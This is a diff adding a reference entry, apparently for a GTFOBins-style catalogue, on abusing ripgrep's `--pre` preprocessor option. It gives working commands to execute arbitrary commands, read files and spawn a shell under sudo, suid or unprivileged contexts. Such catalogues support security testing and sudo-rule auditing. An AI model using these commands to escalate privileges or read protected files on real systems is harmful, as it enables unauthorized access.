@@ -1,0 +1,36 @@
+---
+comment: |-
+  The `--pre` option specifies a preprocessor command that is run on every input file. The preprocessor receives the file path as the first argument, and its standard output is used as the input to search. This can be abused to execute arbitrary commands or read files.
+functions:
+  command:
+  - code: |-
+      TF=$(mktemp)
+      echo 'id' > "$TF"
+      chmod +x "$TF"
+      rg --pre "$TF" '' /dev/null
+    comment: |-
+      The command output is shown in the search results. Any command can be written in place of `id`.
+    contexts:
+      sudo:
+      suid:
+        shell: true
+      unprivileged:
+  file-read:
+  - code: |-
+      rg --pre cat '' /path/to/input-file
+    contexts:
+      sudo:
+      suid:
+      unprivileged:
+  shell:
+  - code: |-
+      TF=$(mktemp)
+      printf '#!/bin/sh\n/bin/sh 1>&0' > "$TF"
+      chmod +x "$TF"
+      rg --pre "$TF" '' /dev/null
+    contexts:
+      sudo:
+      suid:
+        shell: true
+      unprivileged:
+...
